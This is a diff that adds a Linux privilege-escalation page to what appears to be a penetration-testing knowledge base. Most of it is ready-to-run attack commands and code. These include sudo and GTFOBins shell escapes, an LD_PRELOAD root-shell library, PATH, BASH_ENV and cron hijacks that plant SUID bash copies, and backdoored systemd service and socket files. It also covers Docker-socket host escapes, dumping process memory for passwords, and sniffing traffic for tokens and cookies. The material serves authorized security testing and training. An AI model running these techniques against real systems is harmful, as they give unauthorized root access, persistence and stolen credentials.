@@ -1,0 +1,326 @@
+---
+title: "Linux Privilege Escalation"
+description: "Comprehensive techniques for escalating privileges on Linux systems, from initial enumeration to root access"
+---
+
+## Overview
+
+Linux privilege escalation involves finding and exploiting misconfigurations, vulnerable software, weak permissions, or kernel vulnerabilities to elevate from a low-privilege user to root. This page covers the most impactful techniques with practical commands.
+
+<Warning>
+This content is for authorized penetration testing and security research only. Always obtain written permission before testing any system.
+</Warning>
+
+## System Enumeration
+
+### OS and Kernel Information
+
+```bash
+(cat /proc/version || uname -a) 2>/dev/null
+cat /etc/os-release 2>/dev/null
+cat /proc/version
+uname -a
+searchsploit "Linux Kernel"
+```
+
+### Environment Variables
+
+Interesting information, passwords, or API keys may live in environment variables:
+
+```bash
+(env || set) 2>/dev/null
+```
+
+### Sudo Version Check
+
+```bash
+sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
+```
+
+<Note>
+Sudo versions before 1.9.17p1 allow unprivileged local users to escalate via `sudo --chroot` when `/etc/nsswitch.conf` is in a user-controlled directory (CVE-2025-32463). For versions below 1.8.28: `sudo -u#-1 /bin/bash`
+</Note>
+
+## SUDO and SUID Exploitation
+
+<AccordionGroup>
+  <Accordion title="Enumerating Sudo Permissions">
+    ```bash
+    sudo -l  # List what you can run as sudo
+    find / -perm -4000 2>/dev/null  # Find all SUID binaries
+    ```
+
+    Common GTFOBins sudo escalations:
+    ```bash
+    sudo awk 'BEGIN {system("/bin/sh")}'
+    sudo find /etc -exec sh -i \;
+    sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
+    sudo tar c a.tar -I ./runme.sh a
+    ```
+  </Accordion>
+
+  <Accordion title="NOPASSWD Exploitation">
+    If `sudo -l` shows a NOPASSWD entry:
+    ```
+    User demo may run the following commands:
+        (root) NOPASSWD: /usr/bin/vim
+    ```
+
+    Exploit it:
+    ```bash
+    sudo vim -c '!sh'
+    ```
+  </Accordion>
+
+  <Accordion title="SETENV and PYTHONPATH Hijacking">
+    If sudo allows SETENV:
+    ```bash
+    # Example from HTB Admirer
+    sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
+    ```
+  </Accordion>
+
+  <Accordion title="BASH_ENV Preserved via sudo env_keep">
+    If `env_keep` includes `BASH_ENV`:
+
+    ```bash
+    cat > /dev/shm/shell.sh <<'EOF'
+    #!/bin/bash
+    /bin/bash
+    EOF
+    chmod +x /dev/shm/shell.sh
+    BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo
+    ```
+  </Accordion>
+
+  <Accordion title="PATH Hijacking via sudo">
+    If `sudo -l` shows `env_keep+=PATH` or a writable entry in `secure_path`:
+
+    ```bash
+    cat > ~/bin/free <<'EOF'
+    #!/bin/bash
+    chmod +s /bin/bash
+    EOF
+    chmod +x ~/bin/free
+    sudo /usr/local/bin/system_status.sh  # calls free → runs trojan
+    bash -p
+    ```
+  </Accordion>
+
+  <Accordion title="LD_PRELOAD Abuse">
+    If sudo preserves LD_PRELOAD:
+
+    ```c
+    // shell.c
+    #include <stdio.h>
+    #include <sys/types.h>
+    #include <stdlib.h>
+    void _init() {
+        unsetenv("LD_PRELOAD");
+        setgid(0); setuid(0);
+        system("/bin/sh");
+    }
+    ```
+    ```bash
+    gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
+    sudo LD_PRELOAD=/tmp/shell.so find
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Cron Job Abuse
+
+<Steps>
+  <Step title="Enumerate Cron Jobs">
+    ```bash
+    crontab -l
+    ls -al /etc/cron* /etc/at*
+    cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
+    ```
+  </Step>
+
+  <Step title="Cron PATH Hijacking">
+    If a cron job runs a script without full path and the cron PATH includes a user-writable directory:
+
+    ```bash
+    echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
+    chmod +x /home/user/overwrite.sh
+    # Wait for cron to execute, then:
+    /tmp/bash -p
+    ```
+  </Step>
+
+  <Step title="Wildcard Injection">
+    When a cron job uses `*` in a command like rsync:
+
+    ```bash
+    # Creates a file whose name is a rsync argument
+    touch -- '-e sh myscript.sh'
+    ```
+  </Step>
+
+  <Step title="Cron Script Overwrite">
+    If you can modify a cron script:
+
+    ```bash
+    echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /path/to/cron/script.sh
+    # Wait for execution, then:
+    /tmp/bash -p
+    ```
+  </Step>
+
+  <Step title="Monitor Frequent Cron Jobs">
+    Use pspy or manual process monitoring to spot short-interval crons:
+
+    ```bash
+    # Manual monitoring
+    for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done
+    sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"
+    rm /tmp/monprocs.tmp
+    ```
+  </Step>
+</Steps>
+
+## Services and Systemd
+
+<AccordionGroup>
+  <Accordion title="Writable Service Files">
+    If you can write to a `.service` file, add a backdoor:
+
+    ```ini
+    [Service]
+    ExecStart=/tmp/backdoor.sh
+    ```
+  </Accordion>
+
+  <Accordion title="Systemd PATH Relative Binary Hijacking">
+    Check the systemd PATH and look for relative command use in service files:
+
+    ```bash
+    systemctl show-environment
+    # Look for relative paths in ExecStart/ExecStop
+    ```
+
+    Create an executable with the same name in a writable PATH directory.
+  </Accordion>
+
+  <Accordion title="Writable Socket Files">
+    Add a backdoor to `.socket` files:
+
+    ```ini
+    [Socket]
+    ExecStartPre=/home/user/backdoor.sh
+    ```
+  </Accordion>
+
+  <Accordion title="Socket Activation — Missing Service File">
+    If a socket references a non-existent service and you can write to `/etc/systemd/system`:
+
+    ```bash
+    cat >/etc/systemd/system/vuln.service <<'EOF'
+    [Service]
+    Type=oneshot
+    ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
+    EOF
+    nc -q0 127.0.0.1 9999
+    /var/tmp/rootbash -p
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Process Memory Credential Dumping
+
+```bash
+# Use GDB to dump FTP process memory
+gdb -p <FTP_PROCESS_PID>
+(gdb) info proc mappings
+(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
+(gdb) q
+strings /tmp/mem_ftp | grep -i password
+```
+
+### Memory Dump Script
+
+```bash
+#!/bin/bash
+# dump-memory.sh <PID>
+grep rw-p /proc/$1/maps \
+    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
+    | while read start stop; do \
+    gdb --batch --pid $1 -ex \
+    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
+done
+```
+
+### mimipenguin
+
+The tool [mimipenguin](https://github.com/huntergregal/mimipenguin) steals cleartext credentials from memory:
+
+| Feature | Process Name |
+|---------|-------------|
+| GDM password (Kali/Debian Desktop) | gdm-password |
+| Gnome Keyring (Ubuntu Desktop) | gnome-keyring-daemon |
+| LightDM (Ubuntu Desktop) | lightdm |
+| VSFTPd (Active FTP Connections) | vsftpd |
+| Apache2 (HTTP Basic Auth Sessions) | apache2 |
+| OpenSSH (Active SSH Sessions) | sshd: |
+
+## Network Enumeration
+
+```bash
+# Full network enumeration
+cat /etc/hostname /etc/hosts /etc/resolv.conf
+(ifconfig || ip a)
+ip route
+(netstat -punta || ss --ntpu)
+ss -tulpn
+
+# Outbound port check
+for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done
+
+# Sniff traffic
+sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
+  | egrep -i 'authorization:|cookie:|set-cookie:|bearer|token'
+```
+
+## Docker Socket Privilege Escalation
+
+If `/var/run/docker.sock` is writable:
+
+```bash
+docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
+docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
+```
+
+Using the Docker API directly with curl:
+
+```bash
+# List images
+curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
+
+# Create privileged container
+curl -XPOST -H "Content-Type: application/json" \
+  --unix-socket /var/run/docker.sock \
+  -d '{"Image":"ubuntu","Cmd":["/bin/sh"],"OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' \
+  http://localhost/containers/create
+```
+
+## D-Bus Privilege Escalation
+
+D-Bus is an IPC system that can allow privilege escalation if misconfigured policies exist:
+
+```xml
+<!-- Example permissive policy in /etc/dbus-1/system.d/ -->
+<policy user="root">
+    <allow own="fi.w1.wpa_supplicant1"/>
+    <allow send_destination="fi.w1.wpa_supplicant1"/>
+</policy>
+```
+
+## References
+
+- [GTFOBins](https://gtfobins.github.io) — Unix binaries for privilege escalation
+- [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
+- [pspy](https://github.com/DominicBreuker/pspy) — Process monitoring without root
+- [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
+- [CVE-2025-32463 sudo chroot vulnerability](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
